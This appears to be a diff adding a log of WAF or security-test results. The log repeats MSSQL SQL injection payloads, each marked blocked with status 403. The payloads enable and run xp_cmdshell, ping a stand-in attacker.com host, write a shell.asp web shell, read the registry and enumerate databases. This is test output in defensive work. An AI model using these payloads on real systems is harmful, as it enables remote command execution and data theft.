@@ -1,0 +1,300 @@
+{"payload": "'; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.009640737000154331}
+{"payload": "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007488816001568921}
+{"payload": "'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005685458003426902}
+{"payload": "'; EXEC sp_makewebtask 'C:\\inetpub\\wwwroot\\shell.asp', 'SELECT * FROM users'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005483460001414642}
+{"payload": "'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\\inetpub\\wwwroot\\shell.asp', TRUE;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006442609999794513}
+{"payload": "'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005010681998101063}
+{"payload": "'; EXEC sp_who--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005076599001768045}
+{"payload": "'; EXEC sp_helpdb--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0067658920015674084}
+{"payload": "'; EXEC sp_configure--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00539193200529553}
+{"payload": "'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\\Microsoft\\Windows NT\\CurrentVersion', 'ProductName'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0057786679972196}
+{"payload": "'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00615267499233596}
+{"payload": "'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005093866988318041}
+{"payload": "'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006401607999578118}
+{"payload": "'; EXEC sp_MSgetversion--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005420860004960559}
+{"payload": "'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004668205001507886}
+{"payload": "'; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004051258001709357}
+{"payload": "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006074166012695059}
+{"payload": "'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0053559860098175704}
+{"payload": "'; EXEC sp_makewebtask 'C:\\inetpub\\wwwroot\\shell.asp', 'SELECT * FROM users'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0057650100061437115}
+{"payload": "'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\\inetpub\\wwwroot\\shell.asp', TRUE;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004655183991417289}
+{"payload": "'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004674945987062529}
+{"payload": "'; EXEC sp_who--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004288441996322945}
+{"payload": "'; EXEC sp_helpdb--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005984461997286417}
+{"payload": "'; EXEC sp_configure--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00417038299201522}
+{"payload": "'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\\Microsoft\\Windows NT\\CurrentVersion', 'ProductName'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004121368998312391}
+{"payload": "'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00641175800410565}
+{"payload": "'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004184580990113318}
+{"payload": "'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004305484995711595}
+{"payload": "'; EXEC sp_MSgetversion--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0043693979969248176}
+{"payload": "'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005462896995595656}
+{"payload": "'; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004570104996673763}
+{"payload": "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004247460994520225}
+{"payload": "'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005504547007149085}
+{"payload": "'; EXEC sp_makewebtask 'C:\\inetpub\\wwwroot\\shell.asp', 'SELECT * FROM users'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004716226001619361}
+{"payload": "'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\\inetpub\\wwwroot\\shell.asp', TRUE;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00427585699071642}
+{"payload": "'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004640840998035856}
+{"payload": "'; EXEC sp_who--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005624987999908626}
+{"payload": "'; EXEC sp_helpdb--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004420447003212757}
+{"payload": "'; EXEC sp_configure--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004574764010612853}
+{"payload": "'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\\Microsoft\\Windows NT\\CurrentVersion', 'ProductName'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006313436999334954}
+{"payload": "'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0042239280010107905}
+{"payload": "'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004858590997173451}
+{"payload": "'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005897574999835342}
+{"payload": "'; EXEC sp_MSgetversion--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004279313012375496}
+{"payload": "'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004270356992492452}
+{"payload": "'; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004222003000904806}
+{"payload": "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006569834993570112}
+{"payload": "'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0049384519952582195}
+{"payload": "'; EXEC sp_makewebtask 'C:\\inetpub\\wwwroot\\shell.asp', 'SELECT * FROM users'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004384125000797212}
+{"payload": "'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\\inetpub\\wwwroot\\shell.asp', TRUE;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0066531219927128404}
+{"payload": "'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004658445992390625}
+{"payload": "'; EXEC sp_who--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004323528002714738}
+{"payload": "'; EXEC sp_helpdb--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004697109994594939}
+{"payload": "'; EXEC sp_configure--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006106872999225743}
+{"payload": "'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\\Microsoft\\Windows NT\\CurrentVersion', 'ProductName'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005533508010557853}
+{"payload": "'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.008238340000389144}
+{"payload": "'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004873069992754608}
+{"payload": "'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004307479000999592}
+{"payload": "'; EXEC sp_MSgetversion--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0068650409957626835}
+{"payload": "'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005591164008365013}
+{"payload": "'; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004917644007946365}
+{"payload": "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006909055999130942}
+{"payload": "'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004291978999390267}
+{"payload": "'; EXEC sp_makewebtask 'C:\\inetpub\\wwwroot\\shell.asp', 'SELECT * FROM users'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0038513079925905913}
+{"payload": "'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\\inetpub\\wwwroot\\shell.asp', TRUE;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005773245997261256}
+{"payload": "'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004041394000523724}
+{"payload": "'; EXEC sp_who--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003744343004655093}
+{"payload": "'; EXEC sp_helpdb--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004409715998917818}
+{"payload": "'; EXEC sp_configure--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005365067991078831}
+{"payload": "'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\\Microsoft\\Windows NT\\CurrentVersion', 'ProductName'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004042257001856342}
+{"payload": "'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003887558006681502}
+{"payload": "'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007853828006773256}
+{"payload": "'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004797102999873459}
+{"payload": "'; EXEC sp_MSgetversion--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003985407005529851}
+{"payload": "'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006613746008952148}
+{"payload": "'; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004802121999091469}
+{"payload": "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004597758990712464}
+{"payload": "'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.008205856996937655}
+{"payload": "'; EXEC sp_makewebtask 'C:\\inetpub\\wwwroot\\shell.asp', 'SELECT * FROM users'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004790619990671985}
+{"payload": "'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\\inetpub\\wwwroot\\shell.asp', TRUE;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004497022993746214}
+{"payload": "'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006031452998286113}
+{"payload": "'; EXEC sp_who--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00488425100047607}
+{"payload": "'; EXEC sp_helpdb--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004018740000901744}
+{"payload": "'; EXEC sp_configure--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005468121002195403}
+{"payload": "'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\\Microsoft\\Windows NT\\CurrentVersion', 'ProductName'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004889596995781176}
+{"payload": "'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004194179011392407}
+{"payload": "'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003982661000918597}
+{"payload": "'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005317137009114958}
+{"payload": "'; EXEC sp_MSgetversion--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004453178989933804}
+{"payload": "'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003982040012488142}
+{"payload": "'; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003727112998603843}
+{"payload": "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004774107990670018}
+{"payload": "'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004796952998731285}
+{"payload": "'; EXEC sp_makewebtask 'C:\\inetpub\\wwwroot\\shell.asp', 'SELECT * FROM users'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003959576002671383}
+{"payload": "'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\\inetpub\\wwwroot\\shell.asp', TRUE;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004501172996242531}
+{"payload": "'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004680626996560022}
+{"payload": "'; EXEC sp_who--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005127361000631936}
+{"payload": "'; EXEC sp_helpdb--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0063481139950454235}
+{"payload": "'; EXEC sp_configure--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0056881649943534285}
+{"payload": "'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\\Microsoft\\Windows NT\\CurrentVersion', 'ProductName'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004831213998841122}
+{"payload": "'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004567509997286834}
+{"payload": "'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004549859993858263}
+{"payload": "'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0035394520091358572}
+{"payload": "'; EXEC sp_MSgetversion--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0033720250066835433}
+{"payload": "'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0034961660130647942}
+{"payload": "'; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004951968003297225}
+{"payload": "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003985605988418683}
+{"payload": "'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0036976740084355697}
+{"payload": "'; EXEC sp_makewebtask 'C:\\inetpub\\wwwroot\\shell.asp', 'SELECT * FROM users'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003045384000870399}
+{"payload": "'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\\inetpub\\wwwroot\\shell.asp', TRUE;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005086750999907963}
+{"payload": "'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003463961009401828}
+{"payload": "'; EXEC sp_who--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0034253869962412864}
+{"payload": "'; EXEC sp_helpdb--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003133257996523753}
+{"payload": "'; EXEC sp_configure--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0044213530054548755}
+{"payload": "'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\\Microsoft\\Windows NT\\CurrentVersion', 'ProductName'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0044853010040242225}
+{"payload": "'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0036037609970662743}
+{"payload": "'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003180073996190913}
+{"payload": "'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0038304190093185753}
+{"payload": "'; EXEC sp_MSgetversion--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005477504993905313}
+{"payload": "'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004651152004953474}
+{"payload": "'; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00420790100179147}
+{"payload": "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006967679000808857}
+{"payload": "'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0049711239989846945}
+{"payload": "'; EXEC sp_makewebtask 'C:\\inetpub\\wwwroot\\shell.asp', 'SELECT * FROM users'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004735092996270396}
+{"payload": "'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\\inetpub\\wwwroot\\shell.asp', TRUE;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007037915012915619}
+{"payload": "'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004587248011375777}
+{"payload": "'; EXEC sp_who--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004240473004756495}
+{"payload": "'; EXEC sp_helpdb--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006383758009178564}
+{"payload": "'; EXEC sp_configure--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00434644399501849}
+{"payload": "'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\\Microsoft\\Windows NT\\CurrentVersion', 'ProductName'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00443326000822708}
+{"payload": "'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006177838004077785}
+{"payload": "'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004592677010805346}
+{"payload": "'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004693198003224097}
+{"payload": "'; EXEC sp_MSgetversion--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005394660009187646}
+{"payload": "'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004822992006666027}
+{"payload": "'; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006096248995163478}
+{"payload": "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00628942099865526}
+{"payload": "'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0035866719990735874}
+{"payload": "'; EXEC sp_makewebtask 'C:\\inetpub\\wwwroot\\shell.asp', 'SELECT * FROM users'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004837055996176787}
+{"payload": "'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\\inetpub\\wwwroot\\shell.asp', TRUE;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007359003007877618}
+{"payload": "'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0042978249985026196}
+{"payload": "'; EXEC sp_who--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003955132997361943}
+{"payload": "'; EXEC sp_helpdb--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003497576995869167}
+{"payload": "'; EXEC sp_configure--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0063141880091279745}
+{"payload": "'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\\Microsoft\\Windows NT\\CurrentVersion', 'ProductName'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004036213998915628}
+{"payload": "'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0034187949931947514}
+{"payload": "'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005424412011052482}
+{"payload": "'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00559059799707029}
+{"payload": "'; EXEC sp_MSgetversion--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0044998949888395146}
+{"payload": "'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004736135000712238}
+{"payload": "'; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006307525996817276}
+{"payload": "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0045574510004371405}
+{"payload": "'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004306036003981717}
+{"payload": "'; EXEC sp_makewebtask 'C:\\inetpub\\wwwroot\\shell.asp', 'SELECT * FROM users'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005866463994607329}
+{"payload": "'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\\inetpub\\wwwroot\\shell.asp', TRUE;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004034462996060029}
+{"payload": "'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00395260400546249}
+{"payload": "'; EXEC sp_who--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004268613003659993}
+{"payload": "'; EXEC sp_helpdb--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006125925996457227}
